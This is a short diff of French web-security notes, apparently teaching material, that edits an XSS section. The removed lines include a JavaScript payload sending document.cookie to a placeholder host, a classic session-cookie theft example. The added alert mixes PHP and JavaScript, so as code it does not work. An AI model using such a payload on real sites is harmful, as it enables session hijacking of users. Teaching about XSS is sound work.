@@ -295,6 +295,7 @@ http://exemple.com/?jsessionid=A2938298D293
 
 ### XSS
 
+
 Éxecution de code Javascript sans validation
 
 ```html
@@ -302,11 +303,7 @@ Votre Nom : <input type="text" name="nom" value="" />
 ```
 
 ```js
-alert("'echo $_POST["nom"];'");
-```
-
-```js
-window.location = 'https://www.exemple.com? cookie=' + document.cookie;
+alert("Bonjour " + $_POST["nom"]);
 ```
 
 ---
